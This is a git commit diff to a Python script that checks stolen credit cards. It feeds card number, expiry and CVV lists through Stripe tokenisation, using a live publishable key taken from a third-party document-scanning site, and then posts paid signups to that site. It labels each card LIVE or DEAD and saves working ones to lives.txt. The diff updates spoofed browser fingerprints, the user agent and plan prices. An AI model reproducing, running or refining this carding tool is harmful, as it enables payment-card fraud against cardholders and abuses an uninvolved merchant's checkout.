7ba0f6ecb2da52a80120281ff9403f73a033ebfb
peej666 <52153783+peej666@users.noreply.github.com>
2020-07-20 04:58:17 +0800

    Update gateway1.py

--- gateway1.py
+++ gateway1.py
@@ -1,3 +1,4 @@
+    
 from colorama import Fore, Back, init
 from bs4 import BeautifulSoup
 import requests
@@ -13,13 +14,13 @@ def randomString2(stringLength=8):
     letters= string.ascii_lowercase
     return ''.join(random.sample(letters,stringLength))
 
-def StripeAutomate(credit_card, ccEntry, firstname="Samsoden", lastname="Smith"):
+def StripeAutomate(credit_card, ccEntry, firstname="Jems", lastname="Arno"):
     ccEntry = str(ccEntry)
     ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
     api_token = "https://api.stripe.com/v1/tokens"
     session = requests.Session()
     main_source = BeautifulSoup(session.get("https://doc2scan.com/signup-register.php").text, "html.parser")
-    user_agent =  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+    user_agent =  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
     
     headers = {
         'User-Agent': user_agent,
@@ -31,11 +32,11 @@ def StripeAutomate(credit_card, ccEntry, firstname="Samsoden", lastname="Smith")
 
     stripe_data = {
         'time_on_page': random.randint(55382, 68020),
-        'guid': '01479b8a-8652-44e0-b958-d5bf011c5831',
-        'muid': '8fe97add-dd14-48e9-a2f7-54369ed0fcd2',
-        'sid': '1969f315-6fa1-4921-beda-125504e824e2',
+        'guid': '7a9173a6-2a38-486a-aa16-e7071a83a244',
+        'muid': '5213c855-3bb9-4f44-8ae8-24e0c1d8ab5e',
+        'sid': 'e6eb5163-ecae-435c-bb4f-67071ed01643',
         'key': 'pk_live_kjBJXec9yM8XgF7cuBbqHV2H',
-        'payment_user_agent': 'stripe.js/303cf2d',
+        'payment_user_agent': 'stripe.js/8ab9a2f',
         'card[number]': ccNum,
         'card[cvc]': ccCode,
         'card[exp_month]': ccMonth,
@@ -47,7 +48,7 @@ def StripeAutomate(credit_card, ccEntry, firstname="Samsoden", lastname="Smith")
     try:
         token = stripe_response['id']
     except Exception:
-        print("[" + ccEntry + "] Dead\t----\t" + credit_card + ' => ' + stripe_response['error']['message'] + ' /Blacklisted Bin')
+        print("[" + ccEntry + "] DEAD\t----\t" + credit_card + ' => ' + stripe_response['error']['message'] + ' / FRAUD DETECT!')
         return
 
     result_data = {
@@ -59,29 +60,29 @@ def StripeAutomate(credit_card, ccEntry, firstname="Samsoden", lastname="Smith")
         'card-cvc': ccCode,
         'amount': '1599',
         'email': 'none@none.com',
-        'stripe_plan': 'STDmonthly199',
-        'stripeToken': 'tok_1ErJDpHSRJEHtpzdJ5nnRsET',
-        'stripe_plan': 'STDmonthly199',
-        'amount': '1.99',
+        'stripe_plan': 'STDmonthly299',
+        'stripeToken': token,
+        'stripe_plan': 'STDmonthly299',
+        'amount': '2.99',
         'planid': 'STD',
-        'planprice': '1.99',
+        'planprice': '2.99',
         'term': 'monthly',
     }
     result = session.post('https://doc2scan.com/signup-register.php', data=result_data,).text
     try:
         res = BeautifulSoup(result, 'html.parser').findAll('font', {'color': 'red'})[1].get_text()
         if 'code' in res.lower():
-            print(Fore.LIGHTGREEN_EX + "[" + ccEntry + "]" "Live\t----\t" + credit_card + ' => ' + res.replace("\n", "") + Fore.RESET)
+            print(Fore.LIGHTGREEN_EX + "[" + ccEntry + "]" "LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", "") + Fore.RESET)
             with open("lives.txt", "a") as filelive:
                 filelive.write(credit_card + " - Invalid CVV")
                 filelive.close()
-            return("Live\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
+            return("LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
         else:
-            print("[" + ccEntry + "] Dead\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
-            return('Dead\t----\t' + credit_card + " => " + res.replace("\n", ""))
+            print("[" + ccEntry + "] DEAD\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
+            return('DEAD\t----\t' + credit_card + " => " + res.replace("\n", ""))
     except Exception as e:
-        print("Live\t----\t" + credit_card)
+        print("LIVE\t----\t" + credit_card)
         with open("lives.txt", "a") as livefile:
             livefile.write(credit_card + " - Valid CVV")
             livefile.close()
-        return("Live\t----\t" + credit_card)
+        return("LIVE\t----\t" + credit_card)
